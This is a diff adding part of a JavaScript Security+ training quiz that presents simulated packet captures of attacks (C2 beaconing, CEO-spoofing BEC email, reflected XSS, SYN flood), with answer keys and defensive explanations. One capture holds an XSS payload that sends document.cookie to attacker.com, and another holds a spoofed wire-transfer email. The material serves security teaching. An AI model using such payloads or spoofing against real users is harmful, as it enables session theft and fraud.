+      explanation: "<strong>C2 beaconing</strong> — regular, tiny transmissions at consistent intervals to an unknown destination = malware checking in with its command-and-control server. Browsing is bursty and irregular; beacons are regular. Detection: NetFlow analysis with jitter analysis (beacons are suspiciously regular). Defense: TLS inspection, DNS filtering for new/unknown domains, egress filtering, behavioral NGFW."
+    },
+    {
+      title: 'CAPTURE 6 — SMTP Traffic',
+      data: `SRC: 198.51.100.22  →  DST: mail.company.com:25
+EHLO mail.attacker.com
+MAIL FROM: <ceo@company.com>
+RCPT TO: <finance@company.com>
+DATA:
+  From: CEO John Smith <ceo@company.com>
+  To: Finance Team
+  Subject: URGENT — Wire Transfer Required
+
+  Please wire $48,000 to account [REDACTED] immediately.
+  This is time-sensitive. Do not call to verify.`,
+      question: 'What attack is being attempted?',
+      options: ['SMTP relay abuse', 'BEC (Business Email Compromise) via email spoofing', 'Phishing with malicious attachment', 'SMTP smuggling'],
+      correct: 1,
+      explanation: "<strong>BEC (Business Email Compromise)</strong> via email spoofing. The MAIL FROM header shows the attacker's real domain, but the DATA header (From:) is spoofed to show the CEO's email. Many email clients show only the From: header. The 'do not call to verify' is social engineering to prevent confirmation. Defense: DMARC (would reject/quarantine unauthenticated email claiming to be from company.com), MFA on email accounts, financial wire transfer verification procedures."
+    },
+    {
+      title: 'CAPTURE 7 — Web Traffic',
+      data: `GET /search?q=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script> HTTP/1.1
+Host: vulnerable-site.com
+
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+<html><body>
+Results for: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
+</body></html>`,
+      question: 'What web application vulnerability is demonstrated?',
+      options: ['CSRF', 'Reflected XSS (Cross-Site Scripting)', 'SQL Injection', 'XML injection'],
+      correct: 1,
+      explanation: "<strong>Reflected XSS</strong> — the server reflects the user-supplied script directly back in the HTML response without sanitization. The victim's browser executes it, sending their session cookie to the attacker (cookie theft → session hijacking). 'Reflected' = payload in request, reflected in response (vs Stored XSS which persists in database). Defense: output encoding, Content Security Policy (CSP), HttpOnly cookie flag."
+    },
+    {
+      title: 'CAPTURE 8 — Network Flood',
+      data: `SRC: Multiple (10,000+ IPs across 40 countries)
+DST: 203.0.113.50:443 (company web server)
+Protocol: TCP SYN
+Rate: 8.4 million packets/second
+Pattern: All SYNs, no ACKs — half-open connections
+Server state: TCP connection table 100% full
+Result: Legitimate users cannot establish connections`,
+      question: 'What attack and what defensive technology would mitigate it?',
+      options: [
+        'Ping flood — mitigated by ICMP blocking',
+        'SYN Flood DDoS — mitigated by SYN cookies, rate limiting, and upstream scrubbing',
+        'HTTP flood — mitigated by WAF',
+        'UDP amplification — mitigated by egress filtering'
+      ],
+      correct: 1,
+      explanation: "<strong>SYN Flood DDoS</strong> exhausts the TCP connection table with half-open connections. Mitigations: <strong>SYN cookies</strong> (server doesn't allocate state until full handshake — stateless validation), rate limiting, upstream DDoS scrubbing services (Cloudflare, Akamai), connection table tuning. Distributed source means IP blocking is ineffective — need volumetric mitigation upstream."
+    }
+  ];
+
+  let pktScore = 0;
+  let pktIdx = 0;
+
+  function renderPacket(idx) {
+    const c = captures[idx];
+    document.getElementById('labDetailView').innerHTML = `
+      <div class="lab-header">
+        <div class="lab-header-title">📡 ${c.title}</div>
+        <div class="lab-header-desc">Analyze the packet capture and identify the attack. ${idx + 1} of ${captures.length}</div>
+      </div>
+      <div style="background:#0a0e1a;border:1px solid rgba(0,212,255,0.2);border-radius:8px;padding:14px;margin:12px 0;font-family:'Share Tech Mono',monospace;font-size:11.5px;color:#00d4ff;white-space:pre;overflow-x:auto;line-height:1.6">${c.data}</div>
+      <div style="font-family:'Share Tech Mono',monospace;font-size:13px;color:var(--text);margin:12px 0 10px"><span style="color:var(--accent-cyan)">?</span> ${c.question}</div>
+      <div id="pktOpts">
+        ${c.options.map((o, i) => `<div class="answer-opt" onclick="pktAnswer(${idx},${i})" style="cursor:pointer;padding:12px 14px;margin:6px 0;border:1px solid rgba(255,255,255,0.08);border-radius:6px;font-size:13px">${o}</div>`).join('')}
+      </div>
+      <div class="feedback-box" id="pktFeedback" style="display:none"></div>
+      <div style="margin-top:12px;color:var(--text-dim);font-size:12px">Score: ${pktScore}/${idx}</div>
+    `;
+  }
+
+  window.pktAnswer = function(qIdx, selected) {
+    const c = captures[qIdx];
+    const opts = document.querySelectorAll('.answer-opt');
+    opts.forEach((o, i) => {
+      o.onclick = null;
+      o.style.cursor = 'default';
+      if (i === c.correct) o.style.cssText += ';border-color:#00ff88;background:rgba(0,255,136,0.1);';
+      if (i === selected && selected !== c.correct) o.style.cssText += ';border-color:#ff3355;background:rgba(255,51,85,0.1);';
+    });
+    if (selected === c.correct) pktScore++;
+    const fb = document.getElementById('pktFeedback');
+    fb.style.display = 'block';
+    fb.innerHTML = `<div class="feedback-title">${selected === c.correct ? '✓ CORRECT' : '✗ INCORRECT'}</div><div class="feedback-text">${c.explanation}</div>
+      <br><button class="action-btn green" onclick="${qIdx + 1 < captures.length ? `pktNext(${qIdx + 1})` : 'pktFinish()'}" style="margin-top:8px">${qIdx + 1 < captures.length ? 'NEXT CAPTURE →' : 'VIEW RESULTS'}</button>`;
+  };
+
+  window.pktNext = function(idx) { pktIdx = idx; renderPacket(idx); };
+
+  window.pktFinish = function() {
+    const pct = Math.round(pktScore / captures.length * 100);
+    document.getElementById('labDetailView').innerHTML = `
+      <div class="lab-header"><div class="lab-header-title">📡 PACKET ANALYSIS — COMPLETE</div></div>
+      <div class="feedback-box">
+        <div class="feedback-title">${pct >= 75 ? '✓ ANALYST PASS' : '✗ NEEDS REVIEW'}</div>
+        <div class="feedback-text">${pktScore}/${captures.length} correct (${pct}%). ${pct < 75 ? 'Review network attack patterns — understanding traffic signatures is critical for Security+ and real-world analysis.' : 'Excellent. You can identify attack signatures from raw packet data.'}</div>
+      </div>
+      <button class="action-btn secondary" onclick="startLab('packets')" style="margin-top:12px">RETRY</button>`;
+  };
+
+  renderPacket(0);
 }
 
 </script>
